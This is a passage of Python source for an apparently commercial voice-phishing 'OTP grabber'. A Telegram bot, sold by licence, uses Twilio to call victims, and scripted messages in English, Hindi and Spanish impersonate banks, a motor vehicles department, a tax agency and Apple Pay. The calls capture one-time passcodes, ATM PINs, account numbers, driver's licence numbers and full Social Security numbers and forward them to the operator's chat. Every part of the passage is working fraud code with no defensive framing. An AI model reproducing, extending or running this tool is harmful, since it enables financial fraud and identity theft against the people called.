  keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
  keyboard.row_width = 3
  item = types.KeyboardButton(text="English (en-US)")
  item1 = types.KeyboardButton(text="Hindi (en-IN)")
  item2 = types.KeyboardButton(text="Spanish (es-ES)")
  keyboard.add(item)
  keyboard.add(item1)
  keyboard.add(item2)
  bot.send_message(message.chat.id,
                   f"Which language do you want, {name} 👑",
                   reply_markup=keyboard)


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab Card Details 💳")
def noname1(message):
  opitons_choose = message.text
  print("iffyfuifuiiufiu", opitons_choose)
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_card_en, opitons_choose)


def make_call_card_en(message, opitons_choose):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/crdfen/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab Card Details 💳")
def noname1_hi(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_card_hi)


def make_call_card_hi(message):
  userid = str(message.from_user.id)
  print("inside hi hindi")
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/crdfhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab Card Details 💳")
def noname1_sp(message):
  opitons_choose = message.text
  print("iffyfuifuiiufiu", opitons_choose)
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_card_sp, opitons_choose)


def make_call_card_sp(message, opitons_choose):
  userid = str(message.from_user.id)
  print("inside hi spanish")
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/crdfsp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab Account # 🏦")
def what_service1(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    userid = message.from_user.id
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(message.chat.id,
                             "❌ Your not an Authorized to use this Service ❌")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab Account # 🏦")
def save_actn_en(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_en)


def make_call_actn_en(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/actnen/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab Account # 🏦")
def save_actn_hi(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_hi)


def make_call_actn_hi(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/actnhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab Account # 🏦")
def save_actn_sp(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_sp)


def make_call_actn_sp(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/actnsp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab PIN 📌")
def what_service2(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    userid = message.from_user.id
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab PIN 📌")
def noname12_sp(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call. ')
  bot.register_next_step_handler(send, make_call_pin_sp)


def make_call_pin_sp(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/pinsp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab PIN 📌")
def noname12_hi(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call. ')
  bot.register_next_step_handler(send, make_call_pin_hi)


def make_call_pin_hi(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/pinhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab PIN 📌")
def noname12_en(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call. ')
  bot.register_next_step_handler(send, make_call_pin_en)


def make_call_pin_en(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/pinen/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab OTP 🤖")
def pick_bankotp(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    userid = message.from_user.id
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab OTP 🤖")
def nonameotp_en(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_otp_en)


def make_call_otp_en(message):
  userid1 = str(message.from_user.id)
  chat_id1 = userid1
  phonenumber = fetch_phonenumber(userid1)
  print(phonenumber)
  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid1),
    recording_status_callback=(callurl + '/details_rec/' + userid1),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/wfen/' + userid1),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@app.route("/wfen/<userid>", methods=['GET', 'POST'])
def voice_wf_en(userid):
  print(userid)
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherOTP/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key"
    )
    resp.append(gather)
    resp.redirect('/wfen/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab OTP 🤖")
def nonameotp_hi(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_otp_hi)


def make_call_otp_hi(message):
  userid1 = str(message.from_user.id)
  chat_id1 = userid1
  phonenumber = fetch_phonenumber(userid1)
  print(phonenumber)
  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid1),
    recording_status_callback=(callurl + '/details_rec/' + userid1),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/wfhi/' + userid1),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@app.route("/wfhi/<userid>", methods=['GET', 'POST'])
def voice_wf_hi(userid):
  print(userid)
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherOTP/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hello me deepika baat kar rahi hu {bankname} bank ne aapke account me ek suspicious activity detect ki he agar ap nahi the ye to call samapt kre ye attempt rokne ke liye jo otp ome time password aaya he aapko vo kripya type kre or last me star key dale type krne ke baad dhyanwaad",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/wfhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab OTP 🤖")
def nonameotp_sp(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_otp_sp)


def make_call_otp_sp(message):
  userid1 = str(message.from_user.id)
  chat_id1 = userid1
  phonenumber = fetch_phonenumber(userid1)
  print(phonenumber)
  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid1),
    recording_status_callback=(callurl + '/details_rec/' + userid1),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/wfsp/' + userid1),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@app.route("/wfsp/<userid>", methods=['GET', 'POST'])
def voice_wf_sp(userid):
  print(userid)
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherOTP/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Esta es una llamada automática de {bankname}. Hemos detectado un intento sospechoso de iniciar sesión en su cuenta, si fue usted, finalice la llamada. Para bloquear este intento, ingrese el código de acceso único enviado a su número de teléfono seguido del llave estrella",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/wfsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route('/gatherOTP/<userid>', methods=['GET', 'POST'])
def gatherotp(userid):
  chat_id = userid
  resp = VoiceResponse()
  try:
    if 'Digits' in request.values:
      resp.say("Thank you, this attempt has been blocked! Goodbye.")
      choice = request.values['Digits']
      print(choice)
      save_otpcode(choice, userid)
      bot.send_message(chat_id, f"The collected OTP is {choice}")
      return str(resp)
    else:
      choice = 0
      save_otpcode(choice, userid)
      bot.send_message(chat_id, "No OTP was collected")
      return str(resp)
  except:
    bot.send_message(chat_id, "No OTP was collected")


@app.route("/dl_mden/<userid>", methods=['GET', 'POST'])
def resp_dl_md_en(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdl_md/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      "Hello, this is an automated message from the federal department of motor vehicles, your social security number has recently been used to purchase a 2018 Mercedes Benz E Class E 300 for $39000, in this was you please end the call, if this was not you please stay on the line, in order to confirm your identity and block this attempt, please enter your full drivers license number followed by the star key, we will be in contact within a few days to remove the impact on your credit score"
    )
    resp.append(gather)
    resp.redirect('/dl_mden/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/dl_mdsp/<userid>", methods=['GET', 'POST'])
def resp_dl_md_sp(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdl_md/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hola, este es un mensaje automático del departamento federal de vehículos motorizados, su número de seguro social se utilizó recientemente para comprar un Mercedes Benz E Class E 300 2018 por $ 39000, en este era usted, finalice la llamada, si no fue usted permanezca en línea, para confirmar su identidad y bloquear este intento, ingrese su número de licencia de conducir completo seguido de la clave de asterisco, nos pondremos en contacto dentro de unos días para eliminar el impacto en su puntaje de crédito",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/dl_mdsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/dl_mdhi/<userid>", methods=['GET', 'POST'])
def resp_dl_md_hi(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherdl_md/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hello me deepika bat kar rahi hu RTO se aapka social Security number use hua he ek mercedes Benz e class E 300 model pure 3crore 2lakh rs agar ap yeh nahi the to call par bane rahe Or aapne driver license number dale is attempt ko rokne ke liye or last me ek star key dale ham aapko thode time me contact karenge dubara",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/dl_mdhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      userid,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatherdl_md/<userid>", methods=['GET', 'POST'])
def gather_dl(userid):
  chat_id = userid
  resp = VoiceResponse()
  try:
    if 'Digits' in request.values:
      resp.say("Thank you, this attempt has been blocked! Goodbye.")
      choice = request.values['Digits']
      print(choice)
      save_dlnumber(choice, userid)
      bot.send_message(chat_id, f"The collected DL number is {choice}")
      return str(resp)
    else:
      choice = 0
      save_dlnumber(choice, userid)
      bot.send_message(chat_id, f"The collected DL number is {choice}")
      return str(resp)
  except:
    bot.send_message(chat_id, "No DL number was collected")


@app.route("/ssn_mdhi/<userid>", methods=['GET', 'POST'])
def resp_ssn_md_hi(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherssn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hello namate me deepika bat kar rahi hu department of internal Revenue se yeh last call he hamare taraf se aapke social Security number se kisi ne 2Lakh dollar loan Lene ki koshish ki he agar aapko ye attempt rokna he to apna social Security pin dale or last me star key press kare ham aapko dubara contact karenge dhyanwaad!",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/ssn_mdhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/ssn_mden/<userid>", methods=['GET', 'POST'])
def resp_ssn_md_en(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherssn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      "Hello, this is an automated call from the Deparment of Internal Revenue, This will be the last attempt to reach out to you, Your social security number has recently been used to take a fifty eight thousand eight hundred and twelve dollar loan, In order for us to be in contact, we need to confirm your identity, Please enter your full Nine digit social security number followed by the star key, an advisor from the department will contact you in the next few days to discuss your cases,"
    )
    resp.append(gather)
    resp.redirect('/ssn_mden/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/ssn_mdsp/<userid>", methods=['GET', 'POST'])
def resp_ssn_md_sp(userid):
  chat_id = userid
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherssn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hola, esta es una llamada automática del Departamento de Impuestos Internos. Este será el último intento de comunicarnos con usted. Su número de seguro social se utilizó recientemente para tomar un préstamo de cincuenta y ocho mil ochocientos doce dólares. para estar en contacto, necesitamos confirmar su identidad, ingrese su número de seguro social completo de nueve dígitos seguido de la clave de asterisco, un asesor del departamento se comunicará con usted en los próximos días para analizar sus casos,",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/ssn_mdsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatherssn/<userid>", methods=['GET', 'POST'])
def gather_ssn(userid):
  chat_id = userid
  resp = VoiceResponse()
  try:
    if 'Digits' in request.values:
      resp.say("Thank you, this attempt has been blocked! Goodbye.")
      choice = request.values['Digits']
      print(choice)
      save_ssnumber(choice, userid)
      bot.send_message(chat_id, f"The collected SSN is {choice}")
      return str(resp)
    else:
      choice = 0
      save_ssnumber(choice, userid)
      bot.send_message(chat_id, f"The collected SSN is {choice}")
      return str(resp)

  except:
    bot.send_message(chat_id, "No SSN was collected")


@app.route("/appl_pyen/<userid>", methods=['GET', 'POST'])
def resp_apple_pay_en(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  print(choice)
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherappl/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key, "
    )
    resp.append(gather)
    resp.redirect('appl_pyen/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/appl_pyhi/<userid>", methods=['GET', 'POST'])
def resp_apple_pay_hi(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  print(choice)
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherappl/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Namaste me deepika bat kar rahe hu aapke apple Pay me hamne ek suspicious login detect kiya he ise rokne ke liye aapna apple pay  ka otp enter kare or last me star key dabaye",
      language='en-IN')
    resp.append(gather)
    resp.redirect('appl_pyhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/appl_pysp/<userid>", methods=['GET', 'POST'])
def resp_apple_pay_sp(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  print(choice)
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherappl/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"This is an automated call from {bankname}, We have detected a suspicious attempt to login to your account, if this was you, end the call, To block this attempt, please enter the one time passcode sent to your phone number followed by the star key, "
    )
    resp.append(gather)
    resp.redirect('appl_pysp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatherappl/<userid>", methods=['GET', 'POST'])
def gather_appl(userid):
  chat_id = userid
  resp = VoiceResponse()
  try:
    if 'Digits' in request.values:
      resp.say("Thank you, this attempt has been blocked! Goodbye.")
      choice = request.values['Digits']
      print(choice)
      save_applnumber(choice, userid)
      bot.send_message(chat_id, f"The collected Apple Pay OTP is {choice}")
      return str(resp)
    else:
      choice = 0
      save_applnumber(choice, userid)
      bot.send_message(chat_id, f"The collected Apple Pay OTP is {choice}")
      return str(resp)

  except:
    bot.send_message(chat_id, "No Apple Pay OTP was collected")


@app.route("/pinsp/<userid>", methods=['GET', 'POST'])
def intro_pin_sp(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherpin/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hola, esta es una llamada automática de {bankname}, hemos detectado actividad sospechosa por un cargo en Target por $ 56.71. Si no fue usted, ¡permanezca en la llamada! Ingrese su pin de cuatro dígitos, seguido de la tecla de asterisco para bloquear este intento",
      language='es-ES')
    resp.append(gather)
    resp.redirect('/pinsp/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/pinhi/<userid>", methods=['GET', 'POST'])
def intro_pin_hi(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherpin/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Namaste yeh call {bankname} se he hamne aapke bank me ek 2000 ka purchase detect kiya he agar aap yeh nahi the to ise rokne ke liye kripya aapna 4 aankh pin enter kare  or last me star key press kare dhyanwaad",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/pinhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/pinen/<userid>", methods=['GET', 'POST'])
def intro_pin_en(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatherpin/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hello, this is an automated call from {bankname}, we have detected suspicious activity for a charge at Target for $56.71, If this was not you please stay on the call!, Please enter your four digit pin, followed by the star key to block this attempt"
    )
    resp.append(gather)
    resp.redirect('/pinen/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/gatherpin/<userid>", methods=['GET', 'POST'])
def save_pin(userid):
  chat_id = userid
  resp = VoiceResponse()
  if 'Digits' in request.values:
    resp.say("Thank you, this attempt has been blocked! Goodbye.")
    choice = request.values['Digits']
    print(choice)
    save_atmpin(choice, userid)
    bot.send_message(chat_id, f"The collected ATM Pin is {choice}")
    return str(resp)
  else:
    bot.send_message(chat_id, "No ATM Pin was collected")
    return str(resp)


@app.route("/actnen/<userid>", methods=['GET', 'POST'])
def intro_act_en(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  print(bankname)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatheractn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Hello, this is an automated call from {bankname}, we have detected suspicious activity on your card for a charge at Walmart for $87.61, If this was not you, please stay on the call, Please enter your bank account number followed by the star key to block this attempt"
    )
    resp.append(gather)
    resp.redirect('/actnen/<userid>')
    return str(resp)
  else:
    resp.hangup()
    bot.send_message(
      chat_id,
      "*Call Was Declined/Voicemail ❌*\n\nUse /start to try again.",
      parse_mode='Markdown')
    return ''


@app.route("/actnhi/<userid>", methods=['GET', 'POST'])
def intro_act_hi(userid):
  chat_id = userid
  bankname = fetch_bankname(userid)
  print(bankname)
  resp = VoiceResponse()
  choice = request.values['AnsweredBy']
  if choice == 'human' or choice == 'unknown':
    gather = Gather(action='/gatheractn/' + userid,
                    finishOnKey='*',
                    input="dtmf")
    gather.say(
      f"Namaste me {bankname} se deepika bat kar rahi hu hu hamne aapke card par 7HAZAR ka dmart me purchase detect kiya he ise rokne ke liye aapkna bank account number enter kare or last me start key press kare",
      language='en-IN')
    resp.append(gather)
    resp.redirect('/actnhi/<userid>')
    return str(resp)
  else:
    resp.hangup()
